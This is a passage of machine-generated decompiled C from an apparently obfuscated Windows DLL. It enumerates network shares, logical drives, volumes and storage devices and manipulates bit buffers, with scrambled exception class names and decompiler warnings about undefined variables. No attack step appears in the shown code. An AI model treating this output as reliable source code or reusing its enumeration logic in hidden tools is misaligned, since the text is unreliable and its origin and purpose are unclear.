  v1 = WNetOpenEnumW(1u, 1u, 0, 0, &hEnum);
  if ( v1 )
  {
    if ( hEnum )
      WNetCloseEnum(hEnum);
    sub_10050D97(&v12, v1);
    v12 = &off_10102888;
    v19 = 4;
    sub_100510EA(&pExceptionObject, (int)&v12);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVMnltYcbknuvQefuHuqdzqmnl_gfjjefwq_sr__);
  }
  sub_1000B1F3((void *)0x4000, (int)v10, 0);
  v19 = 5;
  cCount = -1;
  do
  {
    BufferSize = v10[3];
    v3 = (void *)sub_1000B49B(v10, v2);
    v4 = WNetEnumResourceW(hEnum, &cCount, v3, &BufferSize);
    v5 = 0;
    v13 = v4;
    *(_BYTE *)(v10[1] + 8) = 1;
    if ( v4 && v4 != 259 )
    {
      if ( hEnum )
        WNetCloseEnum(hEnum);
      sub_10050D97(&v12, v4);
      v12 = &off_10102888;
      LOBYTE(v19) = 7;
      sub_100510EA(v11, (int)&v12);
      _CxxThrowException(v11, (_ThrowInfo *)&_TI3_AVBiklOkxkczgrKulyqiabi_gfjjefwq_sr__);
    }
    v6 = sub_1000B4B8(v10);
    if ( cCount )
    {
      v7 = v6;
      do
      {
        sub_10050DD5(v7, v9);
        LOBYTE(v19) = 8;
        sub_10034F16(a1, (int)v9);
        LOBYTE(v19) = 5;
        sub_10034F96(v9);
        ++v5;
        v7 += 32;
      }
      while ( v5 < cCount );
    }
  }
  while ( v13 != 259 );
  if ( hEnum )
    WNetCloseEnum(hEnum);
  LOBYTE(v19) = 0;
  sub_1000B3DF(v10);
  return a1;
}
// 10050FBE: variable 'v2' is possibly undefined
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);
// 10103750: using guessed type int (__thiscall *off_10103750)(void *Block, char);
// 10105D84: using guessed type __TI_flags _TI3_AVBiklOkxkczgrKulyqiabi_gfjjefwq_sr__;
// 10050EF6: using guessed type LONG var_74[12];
// 10050EF6: using guessed type _DWORD var_30[2];

//----- (1005109F) --------------------------------------------------------
_DWORD *__stdcall sub_1005109F(_DWORD *a1, wchar_t *String)
{
  if ( String )
    sub_1000D17D(a1, String);
  else
    sub_1000D17D(a1, &word_1013058C);
  return a1;
}

//----- (100510EA) --------------------------------------------------------
_DWORD *__thiscall sub_100510EA(_DWORD *this, int a2)
{
  sub_10051122(this, a2);
  *this = &off_10102888;
  return this;
}
// 10102888: using guessed type int (__thiscall *off_10102888)(void *Block, char);

//----- (10051122) --------------------------------------------------------
_DWORD *__thiscall sub_10051122(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_10102A68;
  this[1] = *(_DWORD *)(a2 + 4);
  return this;
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (10051163) --------------------------------------------------------
_DWORD *__stdcall sub_10051163(_DWORD *a1, int a2)
{
  *a1 = off_10104488;
  sub_1000D372(a1 + 1, a2);
  sub_1000D17D(a1 + 3, &word_1013047C);
  return a1;
}
// 10104488: using guessed type int (__thiscall *off_10104488[2])(void *Block, char);

//----- (100511AA) --------------------------------------------------------
int *__thiscall sub_100511AA(int *Block, char a2)
{
  sub_100511C9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100511C9) --------------------------------------------------------
void __thiscall sub_100511C9(int *this)
{
  *this = (int)off_10104488;
  sub_1000D3AD(this + 3);
  sub_1000D3AD(this + 1);
}
// 10104488: using guessed type int (__thiscall *off_10104488[2])(void *Block, char);

//----- (10051205) --------------------------------------------------------
_DWORD *__thiscall sub_10051205(LONG *this, _DWORD *a2)
{
  _DWORD *v4; // eax
  WCHAR *v5; // esi
  _DWORD *v6; // eax
  WCHAR Buffer[1024]; // [esp+Ch] [ebp-A40h] BYREF
  WCHAR szVolumeName[264]; // [esp+80Ch] [ebp-240h] BYREF
  int v9[2]; // [esp+A1Ch] [ebp-30h] BYREF
  int pExceptionObject; // [esp+A24h] [ebp-28h] BYREF
  int v11; // [esp+A28h] [ebp-24h] BYREF
  LONG v12; // [esp+A2Ch] [ebp-20h] BYREF
  int v13; // [esp+A30h] [ebp-1Ch]
  int v14; // [esp+A34h] [ebp-18h] BYREF
  LONG v15; // [esp+A38h] [ebp-14h] BYREF
  bool v16; // [esp+A3Fh] [ebp-Dh]
  int v17; // [esp+A48h] [ebp-4h]

  v13 = 0;
  if ( *(_DWORD *)(this[4] + 28) )
  {
    sub_1000D372(a2, (int)(this + 3));
    v17 = 0;
    v13 = 1;
  }
  else
  {
    memset(Buffer, 0, sizeof(Buffer));
    if ( !GetLogicalDriveStringsW(0x400u, Buffer) )
    {
      v4 = sub_1000E9DF(&pExceptionObject, 1, 1);
      v17 = 1;
      sub_1000A947(v4, 53);
    }
    v5 = Buffer;
    sub_1000D17D(&v14, Buffer);
    v17 = 2;
    while ( 1 )
    {
      if ( !*(_DWORD *)(v15 + 28) )
      {
        sub_1000E9DF(&pExceptionObject, 1, 1);
        _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
      }
      memset(szVolumeName, 0, 522);
      if ( !GetVolumeNameForVolumeMountPointW(*(LPCWSTR *)(v15 + 12), szVolumeName, 0x104u) )
      {
        v6 = sub_1000E9DF(&pExceptionObject, 1, 1);
        LOBYTE(v17) = 3;
        sub_1000A947(v6, 65);
      }
      sub_1000D17D(v9, szVolumeName);
      LOBYTE(v17) = 4;
      v16 = sub_1000DE70((int)v9, (int)(this + 1));
      LOBYTE(v17) = 2;
      sub_1000D3AD(v9);
      if ( v16 )
        break;
      v5 += *(_DWORD *)(v15 + 28) + 1;
      sub_1000D17D(&v11, v5);
      LOBYTE(v17) = 5;
      sub_10001236(&v12, &v15);
      LOBYTE(v17) = 2;
      sub_1000D3AD(&v11);
    }
    sub_10001236(&v15, this + 4);
    sub_1000D372(a2, (int)&v14);
    v13 = 1;
    LOBYTE(v17) = 0;
    sub_1000D3AD(&v14);
  }
  return a2;
}
// 10051205: using guessed type LONG var_14;

//----- (100513C8) --------------------------------------------------------
_DWORD *__cdecl sub_100513C8(_DWORD *a1, int a2)
{
  _DWORD *v2; // eax
  WCHAR szVolumeName[522]; // [esp+4h] [ebp-430h] BYREF
  _DWORD v5[7]; // [esp+418h] [ebp-1Ch] BYREF

  v5[3] = 0;
  memset(szVolumeName, 0, sizeof(szVolumeName));
  if ( !GetVolumeNameForVolumeMountPointW(*(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12), szVolumeName, 0x20Au) )
  {
    v2 = sub_1000E9DF(v5, 1, 1);
    v5[6] = 1;
    sub_1000A947(v2, 91);
  }
  sub_1000D17D(a1, szVolumeName);
  return a1;
}

//----- (10051459) --------------------------------------------------------
_DWORD *__stdcall sub_10051459(LONG *a1, _DWORD *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5; // edi
  int v7[2]; // [esp+Ch] [ebp-34h] BYREF
  int v8[2]; // [esp+14h] [ebp-2Ch] BYREF
  int v9[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v10[4]; // [esp+24h] [ebp-1Ch] BYREF
  int v11; // [esp+3Ch] [ebp-4h]

  v10[2] = 0;
  sub_1000D17D(v10, asc_1013056C);
  v11 = 1;
  v2 = sub_10051205(a1, v7);
  LOBYTE(v11) = 2;
  v3 = sub_1000D836(2, (int)v2, v8, 0);
  LOBYTE(v11) = 3;
  v4 = sub_1000D5FF(v9, (int)v10, v3);
  LOBYTE(v11) = 4;
  v5 = sub_10051516(v4);
  LOBYTE(v11) = 3;
  sub_1000D3AD(v9);
  LOBYTE(v11) = 2;
  sub_1000D3AD(v8);
  LOBYTE(v11) = 1;
  sub_1000D3AD(v7);
  LOBYTE(v11) = 0;
  sub_1000D3AD(v10);
  sub_100515E0(a2, v5);
  return a2;
}

//----- (10051516) --------------------------------------------------------
int __cdecl sub_10051516(_DWORD *hDevice)
{
  _DWORD *v1; // eax
  DWORD v2; // eax
  _DWORD *v3; // eax
  int v4; // esi
  DWORD CurrentProcessId; // [esp-4h] [ebp-44h]
  int v7[3]; // [esp+Ch] [ebp-34h] BYREF
  int OutBuffer; // [esp+18h] [ebp-28h] BYREF
  int v9; // [esp+1Ch] [ebp-24h]
  int v10; // [esp+20h] [ebp-20h]
  int v11; // [esp+24h] [ebp-1Ch] BYREF
  _DWORD v12[2]; // [esp+28h] [ebp-18h] BYREF
  DWORD BytesReturned; // [esp+30h] [ebp-10h] BYREF
  int v14; // [esp+3Ch] [ebp-4h]
  HANDLE hDevicea; // [esp+48h] [ebp+8h]

  hDevicea = CreateFileW(*(LPCWSTR *)(hDevice[1] + 12), 0, 7u, 0, 3u, 0, 0);
  if ( hDevicea == (HANDLE)-1 )
  {
    v1 = sub_1000E9DF(&v11, 1, 1);
    v14 = 0;
    sub_1000A947(v1, 127);
  }
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10011AF4((int)v12, hDevicea, 0, 0, v2, CurrentProcessId);
  v14 = 1;
  OutBuffer = 0;
  v9 = 0;
  v10 = 0;
  BytesReturned = 0;
  if ( !DeviceIoControl(hDevicea, 0x2D1080u, 0, 0, &OutBuffer, 0xCu, &BytesReturned, 0) )
  {
    v3 = sub_1000E9DF(v7, 1, 1);
    LOBYTE(v14) = 2;
    sub_1000A947(v3, 143);
  }
  v4 = v9;
  v14 = -1;
  sub_1000A159(v12);
  return v4;
}
// 10051516: using guessed type _DWORD var_18[2];
// 10051516: using guessed type int var_34[3];

//----- (100515E0) --------------------------------------------------------
_DWORD *__cdecl sub_100515E0(_DWORD *a1, int a2)
{
  HDEVINFO ClassDevsW; // esi
  _DWORD *v3; // eax
  BOOL i; // eax
  BOOL DeviceInterfaceDetailA; // edi
  DWORD LastError; // eax
  int v7; // ecx
  struct _SP_DEVICE_INTERFACE_DETAIL_DATA_W *v8; // edi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  struct _SP_DEVINFO_DATA DeviceInfoData; // [esp+10h] [ebp-90h] BYREF
  int v13[5]; // [esp+2Ch] [ebp-74h] BYREF
  struct _SP_DEVICE_INTERFACE_DATA DeviceInterfaceData; // [esp+40h] [ebp-60h] BYREF
  GUID ClassGuid; // [esp+5Ch] [ebp-44h] BYREF
  int v16; // [esp+6Ch] [ebp-34h] BYREF
  _DWORD v17[2]; // [esp+70h] [ebp-30h] BYREF
  int v18; // [esp+78h] [ebp-28h] BYREF
  int hDevice[2]; // [esp+7Ch] [ebp-24h] BYREF
  int v20; // [esp+84h] [ebp-1Ch]
  DWORD RequiredSize; // [esp+88h] [ebp-18h] BYREF
  bool v22; // [esp+8Eh] [ebp-12h]
  unsigned __int8 v23; // [esp+8Fh] [ebp-11h]
  int v24; // [esp+9Ch] [ebp-4h]

  v20 = 0;
  ClassGuid = (GUID)xmmword_100FBF00;
  ClassDevsW = SetupDiGetClassDevsW(&ClassGuid, 0, 0, 0x12u);
  if ( ClassDevsW == (HDEVINFO)-1 )
  {
    v3 = sub_1000E9DF(&v16, 1, 1);
    v24 = 1;
    sub_1000A947(v3, 154);
  }
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_10011BCF(v17, (int)ClassDevsW);
  v24 = 2;
  memset(&DeviceInterfaceData.InterfaceClassGuid, 0, 0x18u);
  DeviceInterfaceData.cbSize = 28;
  v23 = 0;
  for ( i = SetupDiEnumDeviceInterfaces(ClassDevsW, 0, &ClassGuid, 0, &DeviceInterfaceData);
        ;
        i = SetupDiEnumDeviceInterfaces(ClassDevsW, 0, &ClassGuid, v23, &DeviceInterfaceData) )
  {
    if ( !i )
    {
      sub_1000D17D(a1, &word_10130578);
      v20 = 1;
      goto LABEL_11;
    }
    memset(&DeviceInfoData.ClassGuid, 0, 0x18u);
    DeviceInfoData.cbSize = 28;
    RequiredSize = 0;
    DeviceInterfaceDetailA = SetupDiGetDeviceInterfaceDetailA(ClassDevsW, &DeviceInterfaceData, 0, 0, &RequiredSize, 0);
    LastError = GetLastError();
    if ( DeviceInterfaceDetailA || LastError != 122 )
    {
      v11 = sub_1000E9DF(&v18, 1, 1);
      LOBYTE(v24) = 7;
      sub_1000A947(v11, 218);
    }
    sub_1000B1F3((void *)(2 * RequiredSize), (int)v13, 0);
    LOBYTE(v24) = 3;
    v8 = (struct _SP_DEVICE_INTERFACE_DETAIL_DATA_W *)sub_1000B49B(v13, v7);
    v8->cbSize = 6;
    if ( !SetupDiGetDeviceInterfaceDetailW(ClassDevsW, &DeviceInterfaceData, v8, 2 * RequiredSize, 0, &DeviceInfoData) )
    {
      v10 = sub_1000E9DF(&v18, 1, 1);
      LOBYTE(v24) = 4;
      sub_1000A947(v10, 203);
    }
    sub_1000D17D(hDevice, v8->DevicePath);
    LOBYTE(v24) = 5;
    v22 = sub_10051516(hDevice) == a2;
    LOBYTE(v24) = 3;
    sub_1000D3AD(hDevice);
    if ( v22 )
      break;
    LOBYTE(v24) = 2;
    sub_1000B3DF(v13);
    ++v23;
  }
  sub_1000D17D(hDevice, v8->DevicePath);
  LOBYTE(v24) = 6;
  sub_1000D372(a1, (int)hDevice);
  v20 = 1;
  LOBYTE(v24) = 3;
  sub_1000D3AD(hDevice);
  LOBYTE(v24) = 2;
  sub_1000B3DF(v13);
LABEL_11:
  LOBYTE(v24) = 0;
  sub_10011EA5(v17);
  return a1;
}
// 100516D7: variable 'v7' is possibly undefined
// 100FBF00: using guessed type __int128 xmmword_100FBF00;
// 100515E0: using guessed type _DWORD var_30[2];
// 100515E0: using guessed type int var_74[5];

//----- (1005180A) --------------------------------------------------------
_BYTE *__thiscall sub_1005180A(_BYTE *Block, char a2)
{
  sub_1005189B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10051829) --------------------------------------------------------
int __stdcall sub_10051829(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  *(_BYTE *)(a1 + 4) = 0;
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_1010448C;
  *(_DWORD *)(a1 + 12) = v3;
  *(_DWORD *)(a1 + 8) = v4;
  InterlockedIncrement(v3);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 12))(*(_DWORD *)(a1 + 8)) )
  {
    *(_BYTE *)(a1 + 16) = 0;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_BYTE *)(a1 + 16) = 1;
  }
  sub_10020B81(&a2);
  return a1;
}
// 1010448C: using guessed type int (__thiscall *off_1010448C)(void *Block, char);

//----- (1005189B) --------------------------------------------------------
int __thiscall sub_1005189B(_BYTE *this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_1010448C;
  v4 = 2;
  sub_10051922((int)this);
  v4 = 0;
  sub_10020B81(this + 8);
  v4 = -1;
  return sub_1001B492(this);
}
// 1010448C: using guessed type int (__thiscall *off_1010448C)(void *Block, char);

//----- (10051902) --------------------------------------------------------
int __thiscall sub_10051902(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 60))(this[2]);
}

//----- (1005190E) --------------------------------------------------------
int __thiscall sub_1005190E(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 56))(this[2]);
}

//----- (1005191A) --------------------------------------------------------
int __thiscall sub_1005191A(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 80))(this[2]);
}

//----- (10051922) --------------------------------------------------------
int __thiscall sub_10051922(int this)
{
  int result; // eax

  result = (*(int (__thiscall **)(int))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
  {
    result = sub_1001B4C9((_BYTE *)this);
    if ( *(_BYTE *)(this + 16) )
      return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 8) + 8))(*(_DWORD *)(this + 8));
  }
  return result;
}

//----- (10051946) --------------------------------------------------------
int __thiscall sub_10051946(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 76))(this[2]);
}

//----- (1005194E) --------------------------------------------------------
int __thiscall sub_1005194E(_DWORD **this, int a2, int a3)
{
  int v3; // edx

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = 1;
    }
    else if ( a3 == 2 )
    {
      v3 = 2;
    }
  }
  return (*(int (__thiscall **)(_DWORD *, int, int))(*this[2] + 64))(this[2], a2, v3);
}

//----- (10051978) --------------------------------------------------------
int __thiscall sub_10051978(void *this, int a2)
{
  void *v2; // edx

  sub_100201A0(this, a2, 0);
  *(_DWORD *)a2 = &off_101044B0;
  *(_BYTE *)(a2 + 20) = (_BYTE)v2;
  *(_BYTE *)(a2 + 28) = (_BYTE)v2;
  *(_DWORD *)(a2 + 16) = &off_101025F8;
  *(_DWORD *)(a2 + 24) = &off_10102628;
  sub_1000B1F3(0, a2 + 32, v2);
  *(_DWORD *)(a2 + 52) = 0;
  *(_DWORD *)(a2 + 56) = 0;
  *(_BYTE *)(a2 + 60) = 0;
  return a2;
}
// 100519A1: variable 'v2' is possibly undefined
// 101025F8: using guessed type int (__thiscall *off_101025F8)(void *Block, char);
// 10102628: using guessed type int (__stdcall *off_10102628)(int);
// 101044B0: using guessed type int (__thiscall *off_101044B0)(void *Block, char);

//----- (100519F2) --------------------------------------------------------
_BYTE *__thiscall sub_100519F2(_BYTE *Block, char a2)
{
  sub_10051A11(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10051A11) --------------------------------------------------------
void *__thiscall sub_10051A11(_BYTE *this)
{
  *(_DWORD *)this = &off_101044B0;
  sub_1001229E((int)(this + 16));
  return sub_100201D0(this);
}
// 101044B0: using guessed type int (__thiscall *off_101044B0)(void *Block, char);

//----- (10051A4C) --------------------------------------------------------
char __thiscall sub_10051A4C(_BYTE *this, int a2, char a3)
{
  int v4; // eax
  bool v5; // zf
  int v6; // eax

  sub_100202EC(this, a2, 0);
  LOBYTE(v4) = a3;
  v5 = a3 == 0;
  this[60] = a3;
  if ( !v5 )
  {
    v4 = sub_1002024D(this);
    if ( v4 != 1 )
    {
      v6 = sub_1000E88D((int)&a2, 1, 0);
      sub_10012582(v6, 43);
    }
  }
  return v4;
}

//----- (10051AA5) --------------------------------------------------------
_DWORD *__thiscall sub_10051AA5(_BYTE *this, _DWORD *a2)
{
  *a2 = 0;
  a2[1] = 0;
  *((_BYTE *)a2 + 4) = this[60];
  *a2 = sub_100202A4(this) - (this[60] != 0);
  return a2;
}

//----- (10051ADD) --------------------------------------------------------
void __noreturn sub_10051ADD()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 63);
}
// 10051ADD: using guessed type char var_14[16];

//----- (10051AFF) --------------------------------------------------------
void __noreturn sub_10051AFF()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 68);
}
// 10051AFF: using guessed type char var_14[16];

//----- (10051B21) --------------------------------------------------------
char sub_10051B21()
{
  return 1;
}

//----- (10051B24) --------------------------------------------------------
int __thiscall sub_10051B24(void *this, _DWORD *pExceptionObject, int (__thiscall **a3)(void *Block, char), int a4)
{
  _DWORD *v4; // esi
  _DWORD *v6; // eax
  int result; // eax
  char v8; // bl
  int v9; // eax

  v4 = pExceptionObject;
  if ( !pExceptionObject )
  {
    v6 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v6);
  }
  if ( !a3 )
    return 0;
  if ( 8 * pExceptionObject[3] < (unsigned int)a3 )
  {
    sub_1000E7F7(&a3, 1, 0);
    a3 = &off_10102420;
    sub_10052153(&pExceptionObject, (int)&a3);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVKnwhszzdtjyiTfdasySqknWhszzdtjy_yq_sr__);
  }
  v8 = *(_BYTE *)(pExceptionObject[1] + 8);
  v9 = sub_1000B49B(pExceptionObject, (int)this);
  result = (*(int (__thiscall **)(void *, int, _DWORD, int (__thiscall **)(void *, char), int))(*(_DWORD *)this + 60))(
             this,
             v9,
             v4[3],
             a3,
             a4);
  if ( v8 )
    *(_BYTE *)(v4[1] + 8) = 1;
  return result;
}
// 10102420: using guessed type int (__thiscall *off_10102420)(void *Block, char);

//----- (10051BDF) --------------------------------------------------------
void __thiscall sub_10051BDF(_DWORD *this)
{
  sub_1000E843(this);
}

//----- (10051C02) --------------------------------------------------------
_DWORD *__thiscall sub_10051C02(_DWORD *Block, char a2)
{
  sub_10051BDF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10051C21) --------------------------------------------------------
unsigned int __thiscall sub_10051C21(int this, char *a2, int a3, unsigned int a4, char a5)
{
  int v5; // esi
  _DWORD *v6; // eax
  unsigned int v7; // ebx
  int v9; // eax
  unsigned int v10; // edi
  unsigned __int8 v11; // al
  char *v12; // edi
  char v13; // al
  unsigned int v14; // edi
  int v15; // eax
  int v16; // eax
  int v17; // eax
  unsigned int v18; // edi
  unsigned int v19; // ebx
  int v20; // ecx
  LONG *v21; // eax
  int v22; // edi
  unsigned int v23; // ebx
  int v24; // eax
  int v25; // edx
  int v26; // ebx
  char *v27; // edi
  char v28; // al
  char v29; // al
  LONG *v30; // eax
  int v31; // edi
  int v32; // eax
  int v33; // edx
  char *v34; // eax
  int v35; // edx
  int v36; // [esp-4h] [ebp-64h]
  int v37[5]; // [esp+Ch] [ebp-54h] BYREF
  int v38[5]; // [esp+20h] [ebp-40h] BYREF
  int v39[3]; // [esp+34h] [ebp-2Ch] BYREF
  int v40; // [esp+40h] [ebp-20h]
  int v41; // [esp+48h] [ebp-18h]
  int v42; // [esp+4Ch] [ebp-14h]
  unsigned int v43; // [esp+50h] [ebp-10h]
  int v44; // [esp+5Ch] [ebp-4h]
  unsigned int v45; // [esp+70h] [ebp+10h]
  unsigned int v46; // [esp+70h] [ebp+10h]

  v5 = this;
  v42 = this;
  if ( !a2 )
  {
    v6 = sub_1000E7F7(&a5, 1, 0);
    v44 = 0;
    goto LABEL_3;
  }
  v7 = a4;
  if ( 8 * a3 < a4 )
  {
    v6 = sub_1000E7F7(&a5, 1, 0);
    v44 = 1;
LABEL_3:
    sub_10007882((int)v6);
  }
  if ( !a4 )
    return 0;
  v9 = *(unsigned __int8 *)(this + 60);
  v43 = a4;
  v10 = (8 - v9) % 8;
  v45 = 0;
  if ( v7 <= v10 )
  {
    v11 = (*(_BYTE *)(this + 61) << *(_BYTE *)(this + 60)) & (-1 << (8 - v7));
    if ( a5 )
    {
      v12 = a2;
      v13 = sub_100520F0((*(_BYTE *)(this + 61) << *(_BYTE *)(this + 60)) & (-1 << (8 - v7)), *a2, v7);
    }
    else
    {
      v12 = &a2[a3 - 1];
      a5 = *v12;
      v13 = sub_100520F0(a5, v11 >> (8 - v7), (8 - v7) & 7);
    }
    *v12 = v13;
    goto LABEL_43;
  }
  if ( *(_DWORD *)(this + 56) )
  {
    (*(void (__thiscall **)(int, _DWORD, _DWORD))(*(_DWORD *)(this + 16) + 8))(this + 16, 0, 0);
    sub_10012502((_DWORD *)(v5 + 16), 0);
    *(_DWORD *)(v5 + 56) = 0;
  }
  if ( v10 )
  {
    LOBYTE(v45) = ((unsigned __int8)(-1 << *(_BYTE *)(v5 + 60)) & (*(unsigned __int8 *)(v5 + 61) << *(_BYTE *)(v5 + 60))) >> *(_BYTE *)(v5 + 60);
    (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)(v5 + 24) + 16))(v5 + 24, v45);
    v45 = v10;
    v43 = v7 - v10;
  }
  v14 = v43 >> 3;
  sub_1000B1F3((void *)(v43 >> 3), (int)v38, 0);
  v44 = 2;
  v15 = (*(int (__thiscall **)(int))(*(_DWORD *)v5 + 44))(v5);
  v41 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v15 + 12))(v15, v38);
  v16 = sub_1000B6B7(v38, (int)v39, 0, v41);
  LOBYTE(v44) = 3;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)(v5 + 24) + 12))(v5 + 24, v16);
  LOBYTE(v44) = 2;
  sub_1000B3DF(v39);
  v46 = 8 * v41 + v45;
  v43 -= 8 * v41;
  if ( v41 == v14 && v43 && sub_1002024D((void *)v5) )
  {
    v46 += v43;
    v17 = *(_DWORD *)(v5 + 24);
    LOBYTE(v41) = (-1 << (8 - v43)) & *(_BYTE *)(v5 + 61);
    (*(void (__thiscall **)(int, int))(v17 + 16))(v5 + 24, v41);
  }
  if ( *(_DWORD *)(v5 + 56) )
  {
    v18 = *(unsigned __int8 *)(v5 + 60);
    v19 = -(((_BYTE)v18 + (_BYTE)v46) & 7) & 7;
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)(v5 + 16) + 44))(v5 + 16, v39);
    LOBYTE(v44) = 4;
    if ( a5 )
    {
      if ( v18 )
        sub_10052027((void *)v5, v39, v18, 1);
      if ( v18 >= 8 - v19 )
      {
        v21 = (LONG *)sub_1000B67C(v39, (int)v37, 0, v40 - 1);
        LOBYTE(v44) = 5;
        sub_1000B3BD(v21, (int)v39);
        LOBYTE(v44) = 4;
        sub_1000B3DF(v37);
        v5 = v42;
      }
      v22 = v40;
      v23 = v40 - 1;
      if ( v40 != 1 )
      {
        do
        {
          v24 = sub_1000B4B8(v39);
          v20 = (int)a2;
          a2[v25] = *(_BYTE *)(v24 + v25);
        }
        while ( v25 + 1 < v23 );
      }
      v26 = v22 - 1;
      v36 = v22 - 1;
      if ( (v46 & 7) == 0 )
      {
        a2[v26] = *(_BYTE *)sub_1000B4CB((int)v39, v20, v36);
LABEL_41:
        LOBYTE(v44) = 2;
        sub_1000B3DF(v39);
        goto LABEL_42;
      }
      v27 = &a2[v26];
      v28 = *(_BYTE *)sub_1000B4CB((int)v39, v20, v36);
      v29 = sub_100520F0(v28, a2[v26], v46 & 7);
    }
    else
    {
      if ( v19 )
        sub_10052027((void *)v5, v39, v19, 0);
      if ( v19 >= 8 - v18 )
      {
        v30 = (LONG *)sub_1000B67C(v39, (int)v37, 1, v40 - 1);
        LOBYTE(v44) = 6;
        sub_1000B3BD(v30, (int)v39);
        LOBYTE(v44) = 4;
        sub_1000B3DF(v37);
        v5 = v42;
      }
      if ( v40 - 1 > 0 )
      {
        v31 = v40 - 1;
        do
        {
          v32 = sub_1000B4B8(v39);
          a2[v33] = *(_BYTE *)(v32 + v31--);
        }
        while ( v31 > 0 );
      }
      v34 = (char *)sub_1000B4B8(v39);
      v27 = &a2[v35];
      v29 = sub_100520F0(a2[v35], *v34, v46 & 7);
    }
    *v27 = v29;
    goto LABEL_41;
  }
LABEL_42:
  v44 = -1;
  sub_1000B3DF(v38);
  v7 = v46;
LABEL_43:
  *(_BYTE *)(v5 + 60) = (v7 + *(_BYTE *)(v5 + 60)) & 7;
  return v7 != 0 ? v7 : 0;
}
// 10051E89: variable 'v25' is possibly undefined
// 10051EAA: variable 'v20' is possibly undefined
// 10051F49: variable 'v33' is possibly undefined
// 10051F60: variable 'v35' is possibly undefined
// 10051C21: using guessed type int var_40[5];
// 10051C21: using guessed type int var_2C[3];
// 10051C21: using guessed type int var_54[5];

//----- (10051FB8) --------------------------------------------------------
void __noreturn sub_10051FB8()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 274);
}
// 10051FB8: using guessed type char var_14[16];

//----- (10051FDD) --------------------------------------------------------
void __noreturn sub_10051FDD()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 279);
}
// 10051FDD: using guessed type char var_14[16];

//----- (10052002) --------------------------------------------------------
void __noreturn sub_10052002()
{
  int v0; // eax
  char v1[16]; // [esp+0h] [ebp-14h] BYREF
  int v2; // [esp+10h] [ebp-4h]

  v0 = sub_1000E950((int)v1);
  v2 = 0;
  sub_10007DD5(v0, 284);
}
// 10052002: using guessed type char var_14[16];

//----- (10052027) --------------------------------------------------------
char __thiscall sub_10052027(void *this, _DWORD *a2, unsigned int a3, int a4)
{
  unsigned int v4; // ebx
  _DWORD *v5; // edi
  unsigned int v6; // eax
  _BYTE *v7; // esi
  unsigned int i; // edi
  unsigned int j; // edi
  unsigned int v11; // [esp+Ch] [ebp-4h]
  char v12; // [esp+1Fh] [ebp+Fh]

  v4 = a3;
  if ( a3 <= 8 )
  {
    v5 = a2;
LABEL_6:
    v12 = *(_BYTE *)(v5[1] + 8);
    v7 = (_BYTE *)sub_1000B49B(v5, (int)this);
    v6 = v5[3];
    v11 = v6;
    if ( (_BYTE)a4 )
    {
      for ( i = 0; i < v6; ++i )
      {
        if ( i == v6 - 1 )
        {
          v7[i] <<= v4;
        }
        else
        {
          v7[i] = (v7[i] << v4) + (v7[i + 1] >> (8 - v4));
          v6 = v11;
        }
      }
    }
    else
    {
      for ( j = v6 - 1; j != -1; --j )
      {
        if ( j )
        {
          LOBYTE(v6) = (v7[j] >> v4) + (v7[j - 1] << (8 - v4));
          v7[j] = v6;
        }
        else
        {
          *v7 >>= v4;
        }
      }
